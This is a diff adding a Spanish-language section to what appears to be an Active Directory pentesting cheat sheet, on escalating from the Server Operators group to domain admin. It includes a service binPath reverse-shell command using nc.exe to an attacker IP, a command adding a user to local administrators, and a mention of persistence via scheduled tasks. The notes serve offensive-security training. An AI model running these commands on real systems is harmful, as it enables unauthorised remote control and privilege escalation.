@@ -5149,6 +5149,44 @@ Set-DomainObject -Identity tyrell.wellick -SET @{serviceprincipalname='nonexiste
 ```
 
 ####  11.5.2. <a name='server-operators'></a>Server Operators
+
+Es un grupo buit-in en los controladores de dominio (DC) que tiene privilegios para administrar servidores, pero no es un grupo administrativo a nivel dominio como Domain Admins.
+
+👉 Sin embargo, si el DC es el único "servidor" en el entorno, este grupo puede ser la puerta directa para escalar a DA.
+
+##### 🔑 Privilegios que tiene por defecto
+
+Un miembro de Server Operators puede hacer lo siguiente en un Domain Controller:
+
+- ✅ Reiniciar o apagar el sistema
+- ✅ Cargar y descargar driver 
+- ✅ Realizar backups y restores
+- ✅ Iniciar/Detener servicios
+- ✅ Conectarse vía RDP
+- ✅ Escribir en C:\Windows\Tasks
+
+##### Explotación
+
+###### Abuso de privilegios de servicios
+
+```powershell
+sc.exe config someService binPath= "C:\temp\nc.exe -e cmd 10.10.14.11 4444"
+sc.exe stop someService
+sc.exe start someService
+```
+
+###### Agregarte a Administradores Locales del DC
+
+Ya que podemos escribir sobre el servicio o hacer RDP, podemos ejecutarte como `NT AUTHORITY\SYSTEM` y:
+
+```powershell
+net localgroup administrators hacker /add
+```
+
+###### Meter payloads en tareas programadas (Scheduled Tasks
+
+Podemos escribir en `C:\Windows\Tasks`, lo que se puede usar para ejecución diferida o persistencia.
+
 ####  11.5.3. <a name='dnsadmins'></a>DnsAdmins
 
 Los usuarios que son miembros del grupo **DnsAdmins** tienen la capacidad de abusar de una característica del protocolo de gestión DNS de Microsoft para hacer que el servidor DNS cargue cualquier DLL especificada. El servicio que a su vez, ejecuta la DLL se realiza en el contexto de SYSTEM y podría utilizarse en un controlador de dominio (desde donde se ejecuta DNS normalmente) para obtener privilegios de administrador de dominio.
